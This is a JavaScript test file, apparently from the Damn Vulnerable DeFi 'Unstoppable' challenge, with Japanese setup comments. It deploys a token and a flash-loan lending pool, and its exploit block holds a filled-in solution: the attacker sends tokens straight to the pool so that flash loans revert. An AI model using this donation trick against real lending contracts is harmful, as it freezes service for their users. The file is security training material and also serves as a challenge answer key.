const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        //DVTtoken発行
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        //UnstoppableLenderのコントラクトを作成
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        //poolが100万tokenを使うことを許可
        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        //deployerからpoolに100万tokenを送る
        await this.pool.depositTokens(TOKENS_IN_POOL);
        //attackerに100tokenを送る
        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        //poolは100万tokenを持っている
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        //attackerは100tokenを持っている
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
        await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const attackTokenContract = this.token.connect(attacker);
        await attackTokenContract.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
